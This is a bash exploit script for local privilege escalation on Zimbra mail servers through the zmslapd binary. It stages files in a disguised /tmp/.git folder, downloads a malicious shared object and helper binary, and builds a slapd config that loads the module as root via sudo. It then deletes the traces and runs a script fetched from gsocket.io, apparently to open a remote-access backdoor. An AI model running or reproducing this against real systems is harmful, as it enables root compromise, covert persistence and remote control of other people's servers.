#!/bin/bash
echo "~ slapper.sh - zimbra zmslapd local privesc exploit ~"
echo "[+] Setting up..."
mkdir /tmp/.git
cd /tmp/.git

curl -sfkSL https://raw.githubusercontent.com/aels/zimbra-slapper/main/init > init
chmod +x init
curl -sfkSL https://raw.githubusercontent.com/aels/zimbra-slapper/main/sorrymom.so > sorrymom.so
chmod +x sorrymom.so
cat << EOF > /tmp/.git/slapd.conf
include     /opt/zimbra/common/etc/openldap/schema/core.schema
modulepath  /tmp/.git
moduleload  sorrymom.so
database    mdb
maxsize     1073741824
suffix      "dc=my-domain,dc=com"
rootdn      "cn=Manager,dc=my-domain,dc=com"
rootpw      secret
directory   /opt/zimbra/data/ldap/state/openldap-data
index       objectClass eq
EOF
echo "[+] Triggering our exploit..."
sudo /opt/zimbra/libexec/zmslapd -u root -g root -f /tmp/.git/slapd.conf
echo "[+] Cleaning up staged files..."
rm -rf /tmp/.git/slapd.conf
rm -rf /tmp/.git/sorrymom.so
echo "[$] Run gsocket"
/tmp/.git/init <(curl -fsSLk gsocket.io/x) 2>&1
